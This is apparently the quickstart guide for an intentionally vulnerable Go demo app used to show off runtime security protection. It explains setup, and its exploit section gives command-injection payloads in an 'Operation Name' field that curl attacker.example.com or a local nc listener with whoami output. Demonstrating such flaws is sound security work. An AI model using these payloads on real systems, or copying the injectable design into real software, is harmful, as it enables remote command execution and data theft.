# Quick Start Guide

Get the AAR Management System running in under 5 minutes.

## Prerequisites

```bash
# 1. Check Go version (1.21+)
go version

# 2. Install wkhtmltopdf (required for vulnerability demo)
# Ubuntu/Debian:
sudo apt-get install wkhtmltopdf

# macOS:
brew install wkhtmltopdf

# 3. S3 storage (REQUIRED - see setup below)
```

## S3 Setup (REQUIRED)

**Option A: Local MinIO (Recommended)**
```bash
# Terminal 1: Start MinIO
docker run -p 9000:9000 -p 9001:9001 \
  -e MINIO_ROOT_USER=minioadmin \
  -e MINIO_ROOT_PASSWORD=minioadmin \
  minio/minio server /data --console-address ":9001"

# Terminal 2: Create bucket and set env vars
aws s3 mb s3://aar-documents --endpoint-url http://localhost:9000

export S3_ENDPOINT="http://localhost:9000"
export S3_ACCESS_KEY="minioadmin"
export S3_SECRET_KEY="minioadmin"
export S3_BUCKET="aar-documents"
```

**Option B: AWS S3**
```bash
export S3_ENDPOINT=""  # Empty for AWS
export S3_ACCESS_KEY="your-aws-access-key"
export S3_SECRET_KEY="your-aws-secret-key"
export S3_BUCKET="your-bucket-name"
export S3_REGION="us-east-1"
```

## Installation

```bash
# 1. Navigate to project directory
cd /path/to/hs-s3-app

# 2. Download dependencies
go mod download

# 3. Build the application
go build -o aar-system

# 4. Run the application (S3 must be configured!)
./aar-system
```

Or use the start script:
```bash
chmod +x start.sh
./start.sh
```

## Access

Open your browser to: **http://localhost:8080**

## Demo the Vulnerability

1. Click **"Browse AARs"**
2. Click on **"Operation Phantom Strike"** (AAR-20251107-0003)
3. Click **"Generate PDF Report"**
4. Watch the command injection execute

## Pre-Loaded Data

The system includes 4 sample After Action Reports:
- **AAR-20251005-0001** - Operation Enduring Shield
- **AAR-20250920-0002** - Exercise Iron Sentinel
- **AAR-20251107-0003** - Operation Phantom Strike ⚠️ (Contains exploit)
- **AAR-20250815-0004** - Exercise Northern Viking

## Testing the Exploit

### Simple Test (No Network)
```bash
# The pre-loaded "Operation Phantom Strike" contains:
Operation Name: Operation Phantom Strike'; curl http://attacker.example.com/exfil?data=$(whoami); echo 'Complete
```

### Live Test with Listener
```bash
# Terminal 1: Start listener
nc -lvp 8000

# Terminal 2: Create new AAR with payload
Operation Name: Test'; curl http://localhost:8000/pwned?user=$(whoami); echo 'Op

# Click "Generate PDF Report" on the AAR
# Terminal 1 will show the incoming request
```

## File Structure

```
hs-s3-app/
├── README.md           ← Full documentation
├── DEMO_SCRIPT.md      ← Complete demo presentation script
├── EXPLOIT_PAYLOADS.md ← Exploitation payload reference
├── QUICKSTART.md       ← This file
├── main.go             ← Application entry point
├── handlers/           ← HTTP request handlers
├── models/             ← Data models
├── storage/            ← In-memory data store
├── s3/                 ← S3 client
├── templates/          ← HTML templates
└── static/             ← CSS styles
```

## Common Issues

### Port Already in Use
```bash
export PORT=8081
./aar-system
```

### wkhtmltopdf Not Found
```bash
# Verify installation
which wkhtmltopdf
wkhtmltopdf --version
```

### Template Errors
```bash
# Ensure you're in the project root
cd /path/to/hs-s3-app
./aar-system
```

## Next Steps

1. **Read the full README.md** for detailed information
2. **Review DEMO_SCRIPT.md** for presentation guide
3. **Check EXPLOIT_PAYLOADS.md** for exploit variations
4. **Configure S3** for full functionality (optional)

## Security Warning

⚠️ This application contains an **intentional RCE vulnerability** for demo purposes.

**DO NOT** deploy in production environments.
**ONLY USE** in isolated, controlled test environments.

---

**Ready to demo runtime security protection!**
